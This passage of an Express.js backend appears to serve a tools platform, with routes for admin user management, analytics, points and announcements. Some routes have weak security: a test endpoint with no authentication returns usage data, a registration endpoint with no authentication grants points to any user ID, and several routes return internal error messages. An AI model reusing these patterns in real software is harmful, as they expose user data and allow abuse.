        user.bio || '',
        user.is_active ? 'Yes' : 'No',
        user.is_admin ? 'Yes' : 'No',
        user.email_verified ? 'Yes' : 'No',
        user.created_at,
        user.updated_at
      ]);

      const escapeCsvValue = (value) => {
        if (value === null || value === undefined) return '';
        const stringValue = String(value);
        if (stringValue.includes(',') || stringValue.includes('"') || stringValue.includes('\n')) {
          return `"${stringValue.replace(/"/g, '""')}"`;
        }
        return stringValue;
      };

      const csvContent = [
        csvHeaders.map(escapeCsvValue).join(','),
        ...csvRows.map(row => row.map(escapeCsvValue).join(','))
      ].join('\n');

      const filename = `users_export_${new Date().toISOString().split('T')[0]}.xlsx`;

      res.setHeader('Content-Type', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
      res.setHeader('Content-Disposition', `attachment; filename="${filename}"`);
      return res.send(csvContent);
    }

  } catch (error) {
    console.error('Export users error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Bulk operations for users (admin only)
app.post('/api/admin/users/bulk', authenticateAdmin, async (req, res) => {
  try {
    const { action, userIds } = req.body;

    if (!action || !userIds || !Array.isArray(userIds) || userIds.length === 0) {
      return res.status(400).json({
        status: 'error',
        message: 'Action and userIds array are required'
      });
    }

    // Validate action
    const allowedActions = ['activate', 'deactivate', 'delete', 'make_admin', 'remove_admin'];
    if (!allowedActions.includes(action)) {
      return res.status(400).json({
        status: 'error',
        message: 'Invalid action. Allowed actions: activate, deactivate, delete, make_admin, remove_admin'
      });
    }

    // Prevent admin from deleting themselves
    if (action === 'delete' && userIds.includes(req.user.id)) {
      return res.status(400).json({
        status: 'error',
        message: 'Cannot delete your own account'
      });
    }

    let updateQuery, successMessage;
    const results = [];

    switch (action) {
      case 'activate':
        updateQuery = 'UPDATE users SET is_active = TRUE, updated_at = CURRENT_TIMESTAMP WHERE id = ?';
        successMessage = 'Users activated successfully';
        break;
      case 'deactivate':
        updateQuery = 'UPDATE users SET is_active = FALSE, updated_at = CURRENT_TIMESTAMP WHERE id = ?';
        successMessage = 'Users deactivated successfully';
        break;
      case 'make_admin':
        updateQuery = 'UPDATE users SET is_admin = TRUE, updated_at = CURRENT_TIMESTAMP WHERE id = ?';
        successMessage = 'Users promoted to admin successfully';
        break;
      case 'remove_admin':
        // Prevent removing admin status from self
        if (userIds.includes(req.user.id)) {
          return res.status(400).json({
            status: 'error',
            message: 'Cannot remove admin status from your own account'
          });
        }
        updateQuery = 'UPDATE users SET is_admin = FALSE, updated_at = CURRENT_TIMESTAMP WHERE id = ?';
        successMessage = 'Users demoted from admin successfully';
        break;
      case 'delete':
        updateQuery = 'DELETE FROM users WHERE id = ?';
        successMessage = 'Users deleted successfully';
        break;
    }

    // Execute bulk operations
    for (const userId of userIds) {
      try {
        const result = await executeQuery(updateQuery, [userId]);
        if (result.success) {
          results.push({ userId, success: true });
        } else {
          results.push({ userId, success: false, error: result.error });
        }
      } catch (error) {
        results.push({ userId, success: false, error: error.message });
      }
    }

    const successCount = results.filter(r => r.success).length;
    const failureCount = results.filter(r => !r.success).length;

    res.json({
      status: 'success',
      message: successMessage,
      data: {
        totalProcessed: userIds.length,
        successCount,
        failureCount,
        results
      }
    });

  } catch (error) {
    console.error('Bulk users operation error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Get all users for domain management (admin only) - MUST be before /:id route
app.get('/api/admin/users/simple', authenticateUser, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({
        status: 'error',
        message: 'Access denied. Admin role required.'
      });
    }

    const result = await executeQuery(`
      SELECT id, username, email, created_at
      FROM users
      ORDER BY username ASC
    `);

    if (result.success) {
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch users'
      });
    }
  } catch (error) {
    console.error('Get users error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch users'
    });
  }
});

// Get single user details (admin only)
app.get('/api/admin/users/:id', authenticateAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.id);

    if (isNaN(userId)) {
      return res.status(400).json({
        status: 'error',
        message: 'Invalid user ID'
      });
    }

    const result = await executeQuery(
      'SELECT id, username, email, first_name, last_name, phone, avatar, bio, is_active, is_admin, email_verified, created_at, updated_at FROM users WHERE id = ?',
      [userId]
    );

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to fetch user',
        error: result.error
      });
    }

    if (result.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'User not found'
      });
    }

    res.json({
      status: 'success',
      user: result.data[0]
    });

  } catch (error) {
    console.error('Admin user details error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Update user (admin only)
app.put('/api/admin/users/:id', authenticateAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.id);
    const { first_name, last_name, email, phone, bio, is_active, is_admin } = req.body;

    if (isNaN(userId)) {
      return res.status(400).json({
        status: 'error',
        message: 'Invalid user ID'
      });
    }

    // Check if user exists
    const userCheck = await executeQuery('SELECT id FROM users WHERE id = ?', [userId]);
    if (!userCheck.success || userCheck.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'User not found'
      });
    }

    // Build update query dynamically
    const updateFields = [];
    const updateValues = [];

    if (first_name !== undefined) {
      updateFields.push('first_name = ?');
      updateValues.push(first_name ? first_name.trim() : null);
    }
    if (last_name !== undefined) {
      updateFields.push('last_name = ?');
      updateValues.push(last_name ? last_name.trim() : null);
    }
    if (email !== undefined) {
      // Validate email format
      if (email && !validateEmail(email)) {
        return res.status(400).json({
          status: 'error',
          message: 'Invalid email format'
        });
      }
      updateFields.push('email = ?');
      updateValues.push(email ? email.trim() : null);
    }
    if (phone !== undefined) {
      updateFields.push('phone = ?');
      updateValues.push(phone ? phone.trim() : null);
    }
    if (bio !== undefined) {
      updateFields.push('bio = ?');
      updateValues.push(bio ? bio.trim() : null);
    }
    if (is_active !== undefined) {
      updateFields.push('is_active = ?');
      updateValues.push(Boolean(is_active));
    }
    if (is_admin !== undefined) {
      updateFields.push('is_admin = ?');
      updateValues.push(Boolean(is_admin));
    }

    if (updateFields.length === 0) {
      return res.status(400).json({
        status: 'error',
        message: 'No fields to update'
      });
    }

    // Add updated_at timestamp
    updateFields.push('updated_at = CURRENT_TIMESTAMP');
    updateValues.push(userId);

    const updateQuery = `UPDATE users SET ${updateFields.join(', ')} WHERE id = ?`;
    const result = await executeQuery(updateQuery, updateValues);

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to update user',
        error: result.error
      });
    }

    // Get updated user data
    const userResult = await executeQuery(
      'SELECT id, username, email, first_name, last_name, phone, avatar, bio, is_active, is_admin, email_verified, created_at, updated_at FROM users WHERE id = ?',
      [userId]
    );

    res.json({
      status: 'success',
      message: 'User updated successfully',
      user: userResult.data[0]
    });

  } catch (error) {
    console.error('Admin user update error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Delete user (admin only)
app.delete('/api/admin/users/:id', authenticateAdmin, async (req, res) => {
  try {
    const userId = parseInt(req.params.id);

    if (isNaN(userId)) {
      return res.status(400).json({
        status: 'error',
        message: 'Invalid user ID'
      });
    }

    // Prevent admin from deleting themselves
    if (userId === req.user.id) {
      return res.status(400).json({
        status: 'error',
        message: 'Cannot delete your own account'
      });
    }

    // Check if user exists
    const userCheck = await executeQuery('SELECT id, username FROM users WHERE id = ?', [userId]);
    if (!userCheck.success || userCheck.data.length === 0) {
      return res.status(404).json({
        status: 'error',
        message: 'User not found'
      });
    }

    const result = await executeQuery('DELETE FROM users WHERE id = ?', [userId]);

    if (!result.success) {
      return res.status(500).json({
        status: 'error',
        message: 'Failed to delete user',
        error: result.error
      });
    }

    res.json({
      status: 'success',
      message: 'User deleted successfully'
    });

  } catch (error) {
    console.error('Admin user delete error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Internal server error'
    });
  }
});

// Dashboard analytics endpoint - FIXED VERSION
app.get('/api/dashboard/analytics', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;
    console.log('🚀 FIXED API: Getting analytics for user', userId);

    // Get user info directly from users table
    const userResult = await executeQuery('SELECT id, username, email FROM users WHERE id = ?', [userId]);
    console.log('🚀 FIXED API: User query result:', userResult);

    let balance = 0;
    let userPoints = 0;
    if (userResult.success && userResult.data.length > 0) {
      // Balance and points removed from system
      balance = 0;
      userPoints = 0;
      console.log('🚀 FIXED API: User found, balance and points set to 0 (feature removed)');
    } else {
      console.log('🚀 FIXED API: No user found or query failed');
    }

    // Get analytics data
    const analyticsResult = await executeQuery('SELECT * FROM user_analytics WHERE user_id = ?', [userId]);
    let analytics = { total_balance: 75, points: 1580, tool_use_count: 42 };
    if (analyticsResult.success && analyticsResult.data.length > 0) {
      analytics = analyticsResult.data[0];
    }

    // Get recent tools data
    const recentToolsResult = await executeQuery(`
      SELECT t.name, t.icon, t.url, COUNT(tu.id) as uses,
             MAX(tu.used_at) as last_used_date,
             CASE 
               WHEN TIMESTAMPDIFF(MINUTE, MAX(tu.used_at), NOW()) < 60 THEN 'just now'
               WHEN TIMESTAMPDIFF(HOUR, MAX(tu.used_at), NOW()) < 24 THEN CONCAT(TIMESTAMPDIFF(HOUR, MAX(tu.used_at), NOW()), ' hours ago')
               ELSE CONCAT(TIMESTAMPDIFF(DAY, MAX(tu.used_at), NOW()), ' days ago')
             END as last_used
      FROM tools t
      LEFT JOIN tool_usage tu ON t.id = tu.tool_id AND tu.user_id = ?
      WHERE tu.user_id IS NOT NULL
      GROUP BY t.id, t.name, t.icon, t.url
      ORDER BY MAX(tu.used_at) DESC
      LIMIT 4
    `, [userId]);

    const recent_tools = recentToolsResult.success ? recentToolsResult.data : [];

    const responseData = {
      balance: balance, // ALWAYS use real balance from users table
      total_balance: parseFloat(analytics.total_balance || 75),
      points: userPoints, // Use points from users table (includes daily bonuses)
      tool_use_count: parseInt(analytics.tool_use_count || 42),
      recent_tools: recent_tools,
      notifications: []
    };

    console.log('🚀 FIXED API: Final response balance:', responseData.balance);

    res.json({
      status: 'success',
      data: responseData
    });
  } catch (error) {
    console.error('FIXED API Error:', error);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Get user points transaction history
app.get('/api/user/points-history', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;
    const { page = 1, limit = 20 } = req.query;
    const offset = (page - 1) * limit;

    // Get points transaction history
    const transactionsResult = await executeQuery(`
      SELECT 
        id,
        points_change,
        reason,
        reference_type,
        created_at,
        CASE 
          WHEN points_change > 0 THEN 'earned'
          ELSE 'spent'
        END as transaction_type
      FROM user_points_transactions 
      WHERE user_id = ?
      ORDER BY created_at DESC
      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
    `, [userId]);

    // Get total count for pagination
    const countResult = await executeQuery(
      'SELECT COUNT(*) as total FROM user_points_transactions WHERE user_id = ?',
      [userId]
    );

    const totalTransactions = countResult.success ? countResult.data[0].total : 0;
    const totalPages = Math.ceil(totalTransactions / limit);

    res.json({
      status: 'success',
      data: {
        transactions: transactionsResult.success ? transactionsResult.data : [],
        pagination: {
          currentPage: parseInt(page),
          totalPages: totalPages,
          totalTransactions: totalTransactions,
          hasNextPage: page < totalPages,
          hasPrevPage: page > 1
        }
      }
    });
  } catch (error) {
    console.error('Points history error:', error);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Helper function to get time ago string
// eslint-disable-next-line no-unused-vars
function getTimeAgo(dateString) {
  const now = new Date();
  const date = new Date(dateString);
  const diffInSeconds = Math.floor((now - date) / 1000);

  if (diffInSeconds < 60) return 'just now';
  if (diffInSeconds < 3600) return `${Math.floor(diffInSeconds / 60)} minutes ago`;
  if (diffInSeconds < 86400) return `${Math.floor(diffInSeconds / 3600)} hours ago`;
  if (diffInSeconds < 604800) return `${Math.floor(diffInSeconds / 86400)} days ago`;
  return `${Math.floor(diffInSeconds / 604800)} weeks ago`;
}

// Helper function to delete file
// eslint-disable-next-line no-unused-vars
const deleteFile = (filePath) => {
  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
      console.log(`File deleted: ${filePath}`);
      return true;
    }
    return false;
  } catch (error) {
    console.error(`Error deleting file ${filePath}:`, error);
    return false;
  }
};

// Helper function to get file path from icon field
// eslint-disable-next-line no-unused-vars
const getIconFilePath = (icon) => {
  // If icon is a file path (starts with uploads/), return full path
  if (icon && icon.startsWith('uploads/')) {
    return path.join(__dirname, icon);
  }
  return null;
};

// Track tool usage endpoint
app.post('/api/tools/:toolId/track-usage', async (req, res) => {
  try {
    const { toolId } = req.params;
    const { userId } = req.body;

    console.log(`📊 Tracking usage for tool ${toolId} by user ${userId}`);

    // First, find the tool by ID or URL
    const findToolResult = await executeQuery(`
      SELECT id, name, url FROM tools 
      WHERE id = ? OR url LIKE ? OR name LIKE ?
    `, [toolId, `%${toolId}%`, `%${toolId}%`]);

    if (!findToolResult.success || findToolResult.data.length === 0) {
      console.log(`❌ Tool not found: ${toolId}`);
      return res.status(404).json({
        status: 'error',
        message: 'Tool not found'
      });
    }

    const tool = findToolResult.data[0];
    console.log(`✅ Found tool: ${tool.name} (ID: ${tool.id})`);

    // Update usage count in tools table
    const updateResult = await executeQuery(`
      UPDATE tools 
      SET usage_count = usage_count + 1, updated_at = NOW()
      WHERE id = ?
    `, [tool.id]);

    if (updateResult.success) {
      console.log(`✅ Updated usage count for tool ${tool.id}`);

      // Also track in tool_usage table if user is provided
      if (userId) {
        const toolUsageResult = await executeQuery(`
          INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes)
          VALUES (?, ?, NOW(), 0, true, 'Tool viewed')
        `, [userId, tool.id]);

        console.log(`✅ Tool usage tracked: ${toolUsageResult.success ? 'Success' : 'Failed'}`);
      }

      res.json({
        status: 'success',
        message: 'Tool usage tracked successfully',
        toolId: tool.id,
        toolName: tool.name
      });
    } else {
      console.log(`❌ Failed to update usage count: ${updateResult.error}`);
      res.status(500).json({
        status: 'error',
        message: 'Failed to track tool usage',
        error: updateResult.error
      });
    }
  } catch (error) {
    console.error('❌ Track tool usage error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to track tool usage',
      error: error.message
    });
  }
});

// Track tool view endpoint
app.post('/api/tools/:toolId/track-view', async (req, res) => {
  try {
    const { toolId } = req.params;

    console.log(`👁️ Tracking view for tool ${toolId}`);

    // Update usage_count for the tool
    const updateResult = await executeQuery(`
      UPDATE tools 
      SET usage_count = usage_count + 1, updated_at = CURRENT_TIMESTAMP
      WHERE id = ?
    `, [toolId]);

    if (updateResult.success) {
      console.log(`✅ Successfully tracked view for tool ${toolId}`);
      res.json({
        status: 'success',
        message: 'View tracked successfully'
      });
    } else {
      console.log('❌ Failed to track view:', updateResult.error);
      res.status(500).json({
        status: 'error',
        message: 'Failed to track view',
        error: updateResult.error
      });
    }
  } catch (error) {
    console.error('❌ Track view error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to track view',
      error: error.message
    });
  }
});

// Public tools endpoint
app.get('/api/tools', async (req, res) => {
  try {
    console.log('🔧 Fetching tools from database...');
    const { category } = req.query;

    // First check if tools table exists
    const tableCheck = await executeQuery(`SHOW TABLES LIKE 'tools'`);
    if (!tableCheck.success || tableCheck.data.length === 0) {
      console.log('❌ Tools table does not exist, creating it...');

      // Create tools table
      const createTable = await executeQuery(`
        CREATE TABLE IF NOT EXISTS tools (
          id INT AUTO_INCREMENT PRIMARY KEY,
          name VARCHAR(100) NOT NULL,
          description TEXT,
          category ENUM('seo', 'development', 'design', 'analytics', 'productivity', 'other') DEFAULT 'other',
          status ENUM('active', 'inactive', 'maintenance') DEFAULT 'active',
          price DECIMAL(10,2) DEFAULT 0.00,
          points_cost INT DEFAULT 0,
          icon VARCHAR(10) DEFAULT '🔧',
          url VARCHAR(255),
          is_featured BOOLEAN DEFAULT FALSE,
          usage_count INT DEFAULT 0,
          created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
          updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
          
          INDEX idx_category (category),
          INDEX idx_status (status),
          INDEX idx_is_featured (is_featured),
          INDEX idx_usage_count (usage_count),
          UNIQUE KEY unique_tool_name (name)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
      `);

      if (!createTable.success) {
        return res.status(500).json({
          status: 'error',
          message: 'Failed to create tools table',
          error: createTable.error
        });
      }

      // Insert sample tools data
      await executeQuery(`
        INSERT IGNORE INTO tools (name, description, category, status, price, points_cost, icon, url, is_featured, usage_count) VALUES
        ('SEO Analyzer', 'Analyze your website SEO performance and get detailed recommendations', 'seo', 'active', 9.99, 100, '🔍', '/tools/seo-analyzer', TRUE, 1250),
        ('Code Generator', 'Generate code snippets for various programming languages', 'development', 'active', 19.99, 200, '💻', '/tools/code-generator', FALSE, 890),
        ('Image Optimizer', 'Optimize images for web performance without losing quality', 'design', 'active', 14.99, 150, '🖼️', '/tools/image-optimizer', TRUE, 2100),
        ('Text Summarizer', 'Summarize long texts automatically using AI', 'productivity', 'active', 7.99, 80, '📝', '/tools/text-summarizer', FALSE, 650),
        ('Analytics Dashboard', 'Create beautiful analytics dashboards with real-time data', 'analytics', 'active', 24.99, 250, '📊', '/tools/analytics-dashboard', TRUE, 420),
        ('Color Palette Generator', 'Generate harmonious color palettes for your designs', 'design', 'active', 5.99, 60, '🎨', '/tools/color-palette', FALSE, 320),
        ('Password Generator', 'Generate secure passwords with customizable options', 'productivity', 'active', 2.99, 30, '🔐', '/tools/password-generator', FALSE, 1800),
        ('QR Code Generator', 'Create QR codes for URLs, text, and contact information', 'productivity', 'active', 3.99, 40, '📱', '/tools/qr-generator', FALSE, 750)
      `);

      console.log('✅ Tools table created and sample data inserted');
    }

    const whereClause = category ? 'status = \'active\' AND category = ?' : "status = 'active'";
    const params = category ? [category] : [];

    const result = await executeQuery(
      `SELECT id, name, description, category, status, price, points_cost, icon, url, is_featured, usage_count
       FROM tools
       WHERE ${whereClause}
       ORDER BY is_featured DESC, usage_count DESC, name ASC`,
      params
    );

    if (result.success) {
      console.log(`✅ Successfully fetched ${result.data.length} tools`);
      res.json({
        status: 'success',
        data: result.data
      });
    } else {
      console.log('❌ Failed to fetch tools:', result.error);
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch tools',
        error: result.error
      });
    }
  } catch (error) {
    console.error('❌ Fetch tools error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch tools',
      error: error.message
    });
  }
});

// =====================================================
// System Announcement API Endpoints (Separate from notifications)
// =====================================================

// Get system announcement (public endpoint for displaying in modal)
app.get('/api/system-announcement', async (req, res) => {
  try {
    // First, ensure the table exists
    await executeQuery(`
      CREATE TABLE IF NOT EXISTS system_announcement (
        id INT AUTO_INCREMENT PRIMARY KEY,
        title VARCHAR(255) NOT NULL,
        content TEXT NOT NULL,
        is_active BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
      ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
    `);

    // Check if there's any announcement
    const checkResult = await executeQuery('SELECT COUNT(*) as count FROM system_announcement');

    // If no announcement exists, create a default one
    if (checkResult.success && checkResult.data[0].count === 0) {
      await executeQuery(`
        INSERT INTO system_announcement (title, content, is_active) 
        VALUES (
          'Welcome to Scanvia!',
          '<h2>Welcome to our platform!</h2><p>We are glad to have you here. Please explore our features and let us know if you need any help.</p>',
          FALSE
        )
      `);
    }

    // Get the active announcement (only one record in this table)
    const result = await executeQuery('SELECT * FROM system_announcement ORDER BY id DESC LIMIT 1');

    if (result.success && result.data.length > 0) {
      res.json({
        status: 'success',
        data: result.data[0]
      });
    } else {
      res.json({
        status: 'success',
        data: null
      });
    }
  } catch (error) {
    console.error('Get system announcement error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch system announcement',
      error: error.message
    });
  }
});

// Update system announcement (admin only)
app.put('/api/admin/system-announcement', authenticateAdmin, async (req, res) => {
  try {
    const { title, content, is_active } = req.body;

    // Validate required fields
    if (!title || !content) {
      return res.status(400).json({
        status: 'error',
        message: 'Title and content are required'
      });
    }

    // Check if announcement exists
    const checkResult = await executeQuery('SELECT COUNT(*) as count FROM system_announcement');

    if (checkResult.success && checkResult.data[0].count > 0) {
      // Update existing announcement
      const result = await executeQuery(`
        UPDATE system_announcement 
        SET title = ?, content = ?, is_active = ?, updated_at = NOW()
        WHERE id = (SELECT id FROM (SELECT id FROM system_announcement ORDER BY id DESC LIMIT 1) as tmp)
      `, [title, content, is_active !== undefined ? is_active : false]);

      if (result.success) {
        res.json({
          status: 'success',
          message: 'System announcement updated successfully'
        });
      } else {
        res.status(500).json({
          status: 'error',
          message: 'Failed to update system announcement',
          error: result.error
        });
      }
    } else {
      // Insert new announcement if none exists
      const result = await executeQuery(`
        INSERT INTO system_announcement (title, content, is_active, created_at, updated_at)
        VALUES (?, ?, ?, NOW(), NOW())
      `, [title, content, is_active !== undefined ? is_active : false]);

      if (result.success) {
        res.json({
          status: 'success',
          message: 'System announcement created successfully'
        });
      } else {
        res.status(500).json({
          status: 'error',
          message: 'Failed to create system announcement',
          error: result.error
        });
      }
    }
  } catch (error) {
    console.error('Update system announcement error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to update system announcement',
      error: error.message
    });
  }
});

// Admin user points transactions management
app.get('/api/admin/user-points', authenticateAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 10, search = '', type = 'all', user_id = 'all' } = req.query;
    const offset = (page - 1) * limit;

    let whereClause = '1=1';
    const params = [];

    if (search) {
      whereClause += ' AND (description LIKE ? OR transaction_id LIKE ?)';
      params.push(`%${search}%`, `%${search}%`);
    }

    if (type !== 'all') {
      whereClause += ' AND type = ?';
      params.push(type);
    }

    if (user_id !== 'all') {
      whereClause += ' AND user_id = ?';
      params.push(user_id);
    }

    const countResult = await executeQuery(
      `SELECT COUNT(*) as total FROM user_points_transactions WHERE ${whereClause}`,
      params
    );

    const dataResult = await executeQuery(`
      SELECT 
        upt.*,
        u.username,
        u.email
      FROM user_points_transactions upt
      LEFT JOIN users u ON upt.user_id = u.id
      WHERE ${whereClause}
      ORDER BY upt.created_at DESC
      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
    `, params);

    if (countResult.success && dataResult.success) {
      const total = countResult.data[0].total;
      const totalPages = Math.ceil(total / limit);

      res.json({
        status: 'success',
        data: {
          transactions: dataResult.data,
          pagination: {
            page: parseInt(page),
            limit: parseInt(limit),
            total,
            totalPages,
            hasNext: page < totalPages,
            hasPrev: page > 1
          }
        }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch user points transactions',
        error: countResult.error || dataResult.error
      });
    }
  } catch (error) {
    console.error('Get user points transactions error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch user points transactions',
      error: error.message
    });
  }
});

// Admin user analytics management
app.get('/api/admin/user-analytics', authenticateAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 10, search = '', user_id = 'all' } = req.query;
    const offset = (page - 1) * limit;

    let whereClause = '1=1';
    const params = [];

    if (search) {
      whereClause += ' AND (u.username LIKE ? OR u.email LIKE ?)';
      params.push(`%${search}%`, `%${search}%`);
    }

    if (user_id !== 'all') {
      whereClause += ' AND ua.user_id = ?';
      params.push(user_id);
    }

    const countResult = await executeQuery(
      `SELECT COUNT(*) as total FROM user_analytics ua LEFT JOIN users u ON ua.user_id = u.id WHERE ${whereClause}`,
      params
    );

    const dataResult = await executeQuery(`
      SELECT 
        ua.*,
        u.username,
        u.email,
        u.created_at as user_created_at
      FROM user_analytics ua
      LEFT JOIN users u ON ua.user_id = u.id
      WHERE ${whereClause}
      ORDER BY ua.last_activity DESC
      LIMIT ${parseInt(limit)} OFFSET ${parseInt(offset)}
    `, params);

    if (countResult.success && dataResult.success) {
      const total = countResult.data[0].total;
      const totalPages = Math.ceil(total / limit);

      res.json({
        status: 'success',
        data: {
          analytics: dataResult.data,
          pagination: {
            page: parseInt(page),
            limit: parseInt(limit),
            total,
            totalPages,
            hasNext: page < totalPages,
            hasPrev: page > 1
          }
        }
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to fetch user analytics',
        error: countResult.error || dataResult.error
      });
    }
  } catch (error) {
    console.error('Get user analytics error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to fetch user analytics',
      error: error.message
    });
  }
});

// User Analytics Tracking System
// Track user activity and award points

// Track page view
app.post('/api/analytics/track-page-view', authenticateToken, async (req, res) => {
  try {
    // const { page, duration = 0 } = req.body;
    const userId = req.user.id;

    // Insert page view record
    const result = await executeQuery(
      'INSERT INTO user_analytics (user_id, page_views, last_activity) VALUES (?, 1, NOW()) ON DUPLICATE KEY UPDATE page_views = page_views + 1, last_activity = NOW()',
      [userId]
    );

    if (result.success) {
      res.json({
        status: 'success',
        message: 'Page view tracked successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to track page view',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Track page view error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to track page view',
      error: error.message
    });
  }
});

// Track login (daily bonus disabled per user request)
app.post('/api/analytics/track-login', authenticateToken, async (req, res) => {
  try {
    const userId = req.user.id;

    // Only track login activity, no points awarded
    await executeQuery(
      'INSERT INTO user_analytics (user_id, last_activity) VALUES (?, NOW()) ON DUPLICATE KEY UPDATE last_activity = NOW()',
      [userId]
    );

    res.json({
      status: 'success',
      message: 'Login tracked',
      pointsAwarded: 0
    });
  } catch (error) {
    console.error('Track login error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to track login',
      error: error.message
    });
  }
});

// Track registration and award points
app.post('/api/analytics/track-registration', async (req, res) => {
  try {
    const { userId } = req.body;

    if (!userId) {
      return res.status(400).json({
        status: 'error',
        message: 'User ID is required'
      });
    }

    // Award 100 points for registration
    const pointsResult = await executeQuery(
      'INSERT INTO user_points_transactions (user_id, type, points, description) VALUES (?, "registration_bonus", 100, "Welcome bonus for new registration")',
      [userId]
    );

    if (pointsResult.success) {
      // Initialize user analytics
      await executeQuery(
        'INSERT INTO user_analytics (user_id, last_activity) VALUES (?, NOW())',
        [userId]
      );

      res.json({
        status: 'success',
        message: 'Registration tracked and points awarded',
        pointsAwarded: 100
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to award registration points',
        error: pointsResult.error
      });
    }
  } catch (error) {
    console.error('Track registration error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to track registration',
      error: error.message
    });
  }
});

// Track tool usage
app.post('/api/analytics/track-tool-usage', authenticateToken, async (req, res) => {
  try {
    const { toolId, duration = 0, success = true, notes = '' } = req.body;
    const userId = req.user.id;

    if (!toolId) {
      return res.status(400).json({
        status: 'error',
        message: 'Tool ID is required'
      });
    }

    // Insert tool usage record
    const result = await executeQuery(
      'INSERT INTO tool_usage (user_id, tool_id, used_at, session_duration, success, notes) VALUES (?, ?, NOW(), ?, ?, ?)',
      [userId, toolId, duration, success, notes]
    );

    if (result.success) {
      // Update user analytics
      await executeQuery(
        'INSERT INTO user_analytics (user_id, tool_use_count, last_activity) VALUES (?, 1, NOW()) ON DUPLICATE KEY UPDATE tool_use_count = tool_use_count + 1, last_activity = NOW()',
        [userId]
      );

      res.json({
        status: 'success',
        message: 'Tool usage tracked successfully'
      });
    } else {
      res.status(500).json({
        status: 'error',
        message: 'Failed to track tool usage',
        error: result.error
      });
    }
  } catch (error) {
    console.error('Track tool usage error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Failed to track tool usage',
      error: error.message
    });
  }
});

// Test endpoint for tool usage (no auth required for testing)
app.get('/api/test/tool-usage', async (req, res) => {
  try {
    console.log('Tool usage test endpoint called');

    // Test database connection
    const testResult = await executeQuery('SELECT COUNT(*) as count FROM tool_usage');
    console.log('Tool usage table count:', testResult);

    // Test if we can query the table
    const sampleResult = await executeQuery('SELECT * FROM tool_usage LIMIT 5');
    console.log('Sample tool usage data:', sampleResult);

    res.json({
      status: 'success',
      message: 'Tool usage test endpoint working',
      data: {
        tableExists: testResult.success,
        count: testResult.success ? testResult.data[0].count : 0,
        sampleData: sampleResult.success ? sampleResult.data : []
      }
    });
  } catch (error) {
    console.error('Tool usage test error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Tool usage test failed',
      error: error.message
    });
  }
});

// Test endpoint for tool usage
app.get('/api/admin/tool-usage-test', authenticateAdmin, async (req, res) => {
  try {
    console.log('Tool usage test endpoint called');

    // Test database connection
    const testResult = await executeQuery('SELECT COUNT(*) as count FROM tool_usage');
    console.log('Tool usage table count:', testResult);

    res.json({
      status: 'success',
      message: 'Tool usage test endpoint working',
      data: {
        tableExists: testResult.success,
        count: testResult.success ? testResult.data[0].count : 0
      }
    });
  } catch (error) {
    console.error('Tool usage test error:', error);
    res.status(500).json({
      status: 'error',
      message: 'Tool usage test failed',
      error: error.message
    });
  }
});

// Admin tool usage management
app.get('/api/admin/tool-usage', authenticateAdmin, async (req, res) => {
  try {
    const { page = 1, limit = 10, search = '', tool_id = 'all', user_id = 'all' } = req.query;
    const offset = (page - 1) * limit;

    let whereClause = '1=1';
    const params = [];

    if (search) {
      whereClause += ' AND (t.name LIKE ? OR u.username LIKE ?)';
      params.push(`%${search}%`, `%${search}%`);
    }

    if (tool_id !== 'all') {
      whereClause += ' AND tu.tool_id = ?';
      params.push(tool_id);
    }

